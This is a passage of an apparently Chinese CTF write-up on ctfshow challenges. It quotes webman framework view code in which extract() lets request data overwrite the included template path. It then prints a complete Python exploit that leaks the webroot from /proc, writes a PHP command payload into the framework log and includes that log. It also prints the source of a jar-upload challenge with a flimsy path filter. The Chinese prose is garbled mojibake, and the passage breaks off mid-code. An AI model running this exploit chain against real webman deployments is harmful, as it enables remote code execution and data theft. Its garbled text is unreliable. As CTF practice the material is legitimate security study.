class="token interpolation"><span class="token variable">$plugin</span></span>.view.handler"</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'view.handler'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$handler</span><span class="token operator">::</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$app</span><span class="token punctuation">,</span> <span class="token variable">$plugin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config&#x2F;view.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'handler'</span> <span class="token operator">=></span> <span class="token class-name static-context">Raw</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">raw_view</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Response</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name static-context">Raw</span><span class="token operator">::</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$plugin</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token punctuation">&#123;</span>    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$plugin</span> <span class="token operator">=</span> <span class="token variable">$plugin</span> <span class="token operator">===</span> <span class="token constant">null</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">plugin</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$plugin</span><span class="token punctuation">;</span>    <span class="token variable">$configPrefix</span> <span class="token operator">=</span> <span class="token variable">$plugin</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"plugin.<span class="token interpolation"><span class="token variable">$plugin</span></span>."</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token variable">$viewSuffix</span> <span class="token operator">=</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$configPrefix</span><span class="token punctuation">&#125;</span></span>view.options.view_suffix"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token variable">$app</span> <span class="token operator">===</span> <span class="token constant">null</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">app</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$app</span><span class="token punctuation">;</span>    <span class="token variable">$baseViewPath</span> <span class="token operator">=</span> <span class="token variable">$plugin</span> <span class="token operator">?</span> <span class="token function">base_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/plugin/<span class="token interpolation"><span class="token variable">$plugin</span></span>/app"</span> <span class="token punctuation">:</span> <span class="token function">app_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$__template_path__</span> <span class="token operator">=</span> <span class="token variable">$app</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$baseViewPath</span></span>/view/<span class="token interpolation"><span class="token variable">$template</span></span>.<span class="token interpolation"><span class="token variable">$viewSuffix</span></span>"</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$baseViewPath</span></span>/<span class="token interpolation"><span class="token variable">$app</span></span>/view/<span class="token interpolation"><span class="token variable">$template</span></span>.<span class="token interpolation"><span class="token variable">$viewSuffix</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">_view_vars</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">_view_vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Try to include php file.</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$__template_path__</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæœ‰å˜é‡è¦†ç›–ï¼Œä¸‹é¢ include å¯ä»¥ç›´æ¥åŒ…å«æ–‡ä»¶ï¼Œå°è¯•ç›´æ¥åŒ…å« proc</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111221436593.png" alt="image-20241111221436593"></p><br><p>é¢„æœŸæ˜¯åŒ…å«æ¡†æ¶æ—¥å¿—æ–‡ä»¶</p><p>å®˜æ–¹expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token comment">#æ³¨æ„ è¿™é‡Œé¢˜ç›®åœ°å€ åº”è¯¥httpsæ¢æˆhttp</span>url <span class="token operator">=</span> <span class="token string">"http://6d2d54ba-5db3-454c-b8b4-869e514c1376.challenge.ctf.show/"</span><span class="token comment">#Author: ctfshow h1xa</span><span class="token keyword">def</span> <span class="token function">get_webroot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Getting webroot..."</span><span class="token punctuation">)</span>        webroot <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'index/testJson?data=&#123;&#123;"name": "guest", "__template_path__": "/proc/&#123;&#125;/cmdline"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>           time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"start.php"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[\033[31m*\033[0m] Found start.php at /proc/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">/cmdline"</span></span><span class="token punctuation">)</span>            webroot <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"start_file="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found webroot: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>webroot<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> webroot<span class="token keyword">def</span> <span class="token function">send_shell</span><span class="token punctuation">(</span>webroot<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#payload = 'index/testJson?data=&#123;&#123;"name":"guest","__template_path__":"&lt;?php%20`ls%20/>&#123;&#125;/public/ls.txt`;?>"&#125;&#125;'.format(webroot)</span>    payload <span class="token operator">=</span> <span class="token string">'index/testJson?data=&#123;&#123;"name":"guest","__template_path__":"&lt;?php%20`cat%20/s00*>&#123;&#125;/public/flag.txt`;?>"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>webroot<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[\033[31m*\033[0m] Shell sent successfully"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed to send shell"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">include_shell</span><span class="token punctuation">(</span>webroot<span class="token punctuation">)</span><span class="token punctuation">:</span>    now <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'index/testJson?data=&#123;&#123;"name":"guest","__template_path__":"&#123;&#125;/runtime/logs/webman-&#123;&#125;-&#123;&#125;-&#123;&#125;.log"&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>webroot<span class="token punctuation">,</span> now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%m"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=================FLAG==================\n"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[32m"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token operator">+</span><span class="token string">"\033[0m"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=================FLAG==================\n"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[\033[31m*\033[0m] Shell included successfully"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed to include shell"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    webroot <span class="token operator">=</span> get_webroot<span class="token punctuation">(</span><span class="token punctuation">)</span>    send_shell<span class="token punctuation">(</span>webroot<span class="token punctuation">)</span>    include_shell<span class="token punctuation">(</span>webroot<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤ç°ï¼‰"><a href="#ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤ç°ï¼‰" class="headerlink" title="ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤ç°ï¼‰"></a>ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤ç°ï¼‰</h2><p>jaræ–‡ä»¶ä¸Šä¼ </p><p>æµ‹è¯•å‘ç°æ‰§è¡ŒjaråŒ…çš„é€»è¾‘æ˜¯å…ˆå¤åˆ¶åæ‰§è¡Œç„¶åå†åˆ é™¤è¿™ä¸ªjaråŒ…</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111224718756.png" alt="image-20241111224718756"></p><p>è€Œä¸”åˆ©ç”¨ç«äº‰å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹</p><p>å°è¯•è¯» ..&#x2F;index.php</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111225209949.png" alt="image-20241111225209949"></p><p>æ‹¿åˆ°æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">:</span>            <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'execute'</span><span class="token punctuation">:</span>             <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">execute_jar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span>            <span class="token function">delete_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">delete_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">".jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">,</span><span class="token variable">$second</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script language='javascript'>alert('<span class="token interpolation"><span class="token variable">$message</span></span>');setTimeout(function()&#123;window.location.href='<span class="token interpolation"><span class="token variable">$url</span></span>';&#125;,<span class="token interpolation"><span class="token variable">$second</span></span>*1000);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_file_name</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Invalid file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$FileType</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$target_file</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$FileType</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"jar"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Invalid file type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uploadOk</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"How did you get here?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"The file "</span><span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">" has been uploaded."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Sorry, there was an error uploading your file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>         <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"No file selected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check_file_name</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z0-9_\-\.]+$/"</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">execute_jar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jar_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token 